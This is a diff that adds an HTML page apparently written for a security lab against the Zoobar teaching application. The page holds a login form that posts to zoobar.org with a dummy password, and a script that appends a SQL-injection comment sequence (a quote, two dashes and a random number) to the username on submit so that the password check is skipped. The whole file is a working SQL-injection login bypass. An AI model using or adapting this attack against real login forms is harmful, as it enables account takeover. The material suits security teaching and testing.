@@ -1,0 +1,17 @@
+<html>
+<head>
+</head>
+<body>
+	<form method="POST" name="loginform" onsubmit="attack()"  action="http://zoobar.org/index.php">
+		<input id="username" type="text" name="login_username" size=25 autocomplete=no />
+		<input type=hidden name=login_password value="whocares" />
+		<input type="submit" name="submit_registration" value="Login"/>
+	</form>
+	<script>
+		function attack() {
+			document.getElementById('username').value = document.getElementById('username').value + "'--" + Math.round(Math.random()*Math.pow(2, 31));
+			return true;
+		}
+	</script>
+</body>
+</html>
